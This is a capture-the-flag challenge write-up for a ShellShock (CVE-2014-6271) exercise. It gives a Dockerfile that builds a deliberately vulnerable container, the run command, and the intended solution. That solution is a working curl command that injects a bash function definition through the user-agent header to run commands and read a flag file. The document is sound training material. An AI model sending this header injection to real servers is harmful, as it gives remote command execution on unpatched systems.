# So Shocked

## Abstract
So Shocked makes use of ShellShock or CVE-2014-6271. There is a bug in the bash which should be exploited. 

## Prompt
I would be shocked if you could use the shell to get this flag.

## Setup
- Using a premade docker container, we can make a slight modification to add our flag.
```
FROM vulnerables/cve-2014-6271

RUN echo "BobcatCTF{This is a flag}" > /etc/security/flag.txt
```
- The contestant should pull the image and run it like:
```
docker run --rm -it -p 8080:80 so-shocked
```

## Solving the challenge
- The contestant will eventually get the idea that this is ShellShock and should then research how it works.
- Once they realize they need to use curl commands to access the contents of the container, they will come up with a solution similar to:
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /*/*/flag*'" http://localhost:8080/cgi-bin/vulnerable
```

## References
- https://youtu.be/-Zy6ILYh4zM
- https://hub.docker.com/r/vulnerables/cve-2014-6271
- https://nvd.nist.gov/vuln/detail/cve-2014-6271

